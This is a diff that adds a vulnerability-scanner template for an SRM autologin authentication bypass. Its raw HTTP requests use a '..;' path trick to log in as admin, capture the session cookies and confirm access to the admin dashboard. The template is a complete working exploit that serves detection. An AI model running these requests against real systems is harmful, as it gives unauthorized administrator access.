@@ -1,0 +1,51 @@
+id: srm-autologin-auth-bypass
+info:
+  name: SRM autologin identity authentication bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: bypass,auth
+http:
+  - raw:
+      - |
+        GET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - ""
+        part: body
+    extractors:
+      - type: regex
+        name: cookie_1
+        part: header
+        regex:
+          - "zhilink.session.id=(.*?);"
+        internal: true
+      - type: regex
+        name: cookie_2
+        part: header
+        regex:
+          - "rememberMe=(.*?);"
+        internal: true
+  - raw:
+      - |
+        GET /adpweb/a HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: zhilink.session.id={{cookie_1}}; rememberMe={{cookie_2}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "管理工作台"
+          - "SRM"
+          - "你好, 系统管理员"
+          - "退出登录"
+        condition: and
+        part: body
